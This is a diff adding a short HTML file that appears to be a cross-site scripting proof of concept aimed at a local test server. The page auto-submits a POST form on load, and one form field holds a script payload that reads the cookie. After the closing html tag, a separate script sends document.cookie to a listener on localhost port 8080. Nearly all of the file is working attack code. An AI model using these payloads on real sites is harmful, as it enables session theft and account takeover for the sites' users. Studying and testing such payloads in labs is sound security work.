@@ -1,0 +1,14 @@
+<html>
+    <head>
+    </head>
+    <body onload="XSS.submit()">
+        <form id="XSS" action="http://localhost/xss_post.php" method="POST">
+            <input type="text" value="<script>alert(document.cookie)</script>" name="firstname">
+            <input type="text" value="blabla" name="lastname">
+        </form>
+    </body>
+</html>
+
+
+
+<script>fetch("http://localhost:8080?cookie="+document.cookie)</script>
